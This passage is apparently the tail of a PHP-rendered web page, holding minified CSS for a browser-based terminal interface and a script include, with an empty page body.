div{display:inline-block}.cmd,.terminal h1,.terminal h2,.terminal h3,.terminal h4,.terminal h5,.terminal h6,.terminal pre{margin:0}.terminal h1,.terminal h2,.terminal h3,.terminal h4,.terminal h5,.terminal h6{line-height:1.2em}.cmd .clipboard{position:absolute;left:-16px;top:0;width:10px;height:16px;background:0 0;border:0;color:transparent;outline:0;padding:0;resize:none;z-index:0;overflow:hidden}.terminal .error{color:red}.terminal{padding:10px;position:relative;overflow:auto}.cmd{padding:0;height:1.3em;position:relative}.cmd .cursor.blink,.cmd .inverted,.terminal .inverted{background-color:#aaa;color:#000}.cmd .cursor.blink{-webkit-animation:terminal-blink 1s infinite steps(1,start);-moz-animation:terminal-blink 1s infinite steps(1,start);-ms-animation:terminal-blink 1s infinite steps(1,start);animation:terminal-blink 1s infinite steps(1,start)}@-webkit-keyframes terminal-blink{0%,100%{background-color:#000;color:#aaa}50%{background-color:#bbb;color:#000}}@-ms-keyframes terminal-blink{0%,100%{background-color:#000;color:#aaa}50%{background-color:#bbb;color:#000}}@-moz-keyframes terminal-blink{0%,100%{background-color:#000;color:#aaa}50%{background-color:#bbb;color:#000}}@keyframes terminal-blink{0%,100%{background-color:#000;color:#aaa}50%{background-color:#bbb;color:#000}}.cmd .prompt,.terminal .terminal-output div div{display:block;line-height:14px;height:auto}.cmd .prompt{float:left}.cmd,.terminal{background-color:#000}.terminal-output>div{min-height:14px}.terminal-output>div>div *{}.terminal .terminal-output div span{display:inline-block}.cmd span{float:left}.cmd div,.cmd span,.terminal h1,.terminal h2,.terminal h3,.terminal h4,.terminal h5,.terminal h6,.terminal pre,.terminal td,.terminal-output a,.terminal-output span{-webkit-touch-callout:initial;-webkit-user-select:initial;-khtml-user-select:initial;-moz-user-select:initial;-ms-user-select:initial;user-select:initial}.terminal,.terminal-output,.terminal-output div{-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}@-moz-document url-prefix(){.terminal,.terminal-output,.terminal-output div{-webkit-touch-callout:initial;-webkit-user-select:initial;-khtml-user-select:initial;-moz-user-select:initial;-ms-user-select:initial;user-select:initial}}.terminal table{border-collapse:collapse}.terminal td{border:1px solid #aaa}.cmd .prompt span::-moz-selection,.cmd div::-moz-selection,.cmd>span::-moz-selection,.terminal .terminal-output div div a::-moz-selection,.terminal .terminal-output div div::-moz-selection,.terminal .terminal-output div span::-moz-selection,.terminal h1::-moz-selection,.terminal h2::-moz-selection,.terminal h3::-moz-selection,.terminal h4::-moz-selection,.terminal h5::-moz-selection,.terminal h6::-moz-selection,.terminal pre::-moz-selection,.terminal td::-moz-selection{background-color:#aaa;color:#000}.cmd .prompt span::selection,.cmd div::selection,.cmd>span::selection,.terminal .terminal-output div div a::selection,.terminal .terminal-output div div::selection,.terminal .terminal-output div span::selection,.terminal h1::selection,.terminal h2::selection,.terminal h3::selection,.terminal h4::selection,.terminal h5::selection,.terminal h6::selection,.terminal pre::selection,.terminal td::selection{background-color:#aaa;color:#000}.terminal .terminal-output div.error,.terminal .terminal-output div.error div{color:red}.tilda{position:fixed;top:0;left:0;width:100%;z-index:1100}.clear{clear:both}body{background-color:#000}.cmd,.terminal,.terminal .prompt,.terminal .terminal-output div div,body{color:#ccc;font-family:monospace,fixed;font-size:15px;line-height:18px}.terminal a,.terminal a:hover,a,a:hover{color:#6c71c4}.spaced{margin:15px 0}.spaced-top{margin:15px 0 0}.spaced-bottom{margin:0 0 15px}.configure{margin:20px}.configure .variable{color:#d33682}.configure p,.configure ul{margin:5px 0 0}</style>
<script language="javascript" src="js/set2.js"></script>
    </head>
    <body></body>
</html>
<?php } ?>